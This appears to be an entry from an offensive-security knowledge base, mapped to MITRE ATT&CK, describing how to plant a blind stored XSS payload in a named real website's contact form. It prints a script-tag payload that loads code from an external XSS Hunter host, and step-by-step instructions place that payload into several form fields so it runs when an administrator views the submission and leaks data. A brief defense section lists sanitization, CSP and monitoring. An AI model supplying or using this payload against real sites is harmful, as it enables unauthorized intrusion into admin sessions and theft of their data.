---
id: proc-uuid-5678
tags:
  - xss
  - stored-xss
  - injection
  - web
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:56.849Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Blind-Stored-XSS-Payload-into-Contact-Form

## Summary

This procedure exploits insufficient input sanitization in web contact form fields to inject a blind stored XSS payload, which is persisted in the backend and awaits execution in an admin context.

## Description

In scenarios like the TopCoder contact form at https://www.topcoder.com/contact-us/, fields such as First name, Last name, Company, and description fail to sanitize HTML and JavaScript, allowing injection of payloads with angle brackets and script tags. The payload is stored blindly (no immediate feedback) and triggers when an admin views the submission in their backend panel, potentially leaking sensitive data. This targets public-facing web applications with user-submittable forms integrated with admin interfaces.

## Requirements

1. Public access to the target website's contact form.
2. Web browser for form interaction.
3. XSS Hunter account to generate and host the blind payload.

## Defense

Defensive measures and detection strategies:

- Implement server-side input sanitization and output encoding (e.g., using libraries like DOMPurify or OWASP ESAPI).
- Validate and escape user inputs, rejecting angle brackets and script tags.
- Use Content Security Policy (CSP) to block inline scripts and external sources.
- Monitor admin panel logs for anomalous JavaScript execution or outbound requests to unknown domains like xss.ht.

## Objectives

1. Persist malicious JavaScript in backend storage via form submission.
2. Set up conditions for payload execution in privileged admin context.
3. Enable data exfiltration upon trigger.

## Instructions

### Step 1: Generate Blind XSS Payload

**Context**: Create a payload using XSS Hunter to beacon back execution details without visible effects.

No command executed; use the XSS Hunter service to generate a payload like `"><script src=https://xvt.xss.ht></script>`. Copy this for form injection.

> This payload closes any open tags and loads an external script that reports to your XSS Hunter instance upon execution.

### Step 2: Access and Populate Contact Form

**Context**: Navigate to the vulnerable form and inject the payload into multiple fields to increase success chances.

No command executed; browse to https://www.topcoder.com/contact-us/ in a web browser. Fill fields:
- First name: `"><script src=https://xvt.xss.ht></script>`
- Last name: Same payload
- Company: Same payload
- Description: Same payload, or a longer variant if needed.

> Ensure the form accepts the input without client-side blocking; test incrementally if validation exists.

### Step 3: Submit the Form

**Context**: Persist the payload by submitting, storing it unsanitized in the backend.

No command executed; click the submit button and observe the confirmation page.

> Successful submission indicates storage; the blind nature means no immediate alert.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- xss
- injection
- web
